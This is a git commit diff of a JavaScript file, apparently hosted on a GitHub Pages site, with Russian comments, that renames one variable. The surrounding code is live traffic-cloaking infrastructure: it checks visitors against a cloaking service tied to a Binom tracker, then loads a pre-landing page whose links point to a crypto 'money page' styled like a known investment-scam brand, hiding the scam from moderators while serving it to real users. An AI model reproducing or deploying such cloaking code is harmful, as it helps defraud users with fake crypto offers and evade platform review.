57ac88430fe8c829f1849648a4860799e5e73f97
Denis8854 <37094139+Denis8854@users.noreply.github.com>
2020-02-17 21:48:41 +0200

    Update magic.js

--- magic.js
+++ magic.js
@@ -1,12 +1,12 @@
 var binomCampaingKey = 's15yun0z67b7t9btickt'; /* Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
 var gitHubId = 'denis8854'; /*ID данного GitHub сайта. Только ID, не вся ссылка!*/
-var preLandingUrl = 'https://serd.site/landing/xhr/mobile_final/latam.php'; /*Адрес преленда, который необходимо подгрузить*/
+var landingUrl = 'https://serd.site/landing/xhr/mobile_final/latam.php'; /*Адрес преленда, который необходимо подгрузить*/
 var moneyPageUrl = 'https://cl.bitcoincircuit.online'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
 var landignLoadingCampaingId = '2dpmfzy61v5pcfgkk3ew'; /*Key кампании в Binom, в которой будут отображатся логи при загрузке преленда девайсом юзера. Служит для отслеживания потери трафика. По умолчанию стоит стандартная кампания GLOBAL Landing Loading, id:167*/
 
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
 
-var preLanding = preLandingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landignLoadingCampaingId; 
+var landing = landingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landignLoadingCampaingId; 
 
 var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
 var xhr = new XMLHttpRequest();
@@ -23,7 +23,7 @@ if(cloakResult=="yes"){
 var xhrLand = new XMLHttpRequest();
 var landingCode = '';
 
-xhrLand.open('GET', preLanding, false);
+xhrLand.open('GET', landing, false);
 xhrLand.send();
 
 if (xhrLand.status == 200) {
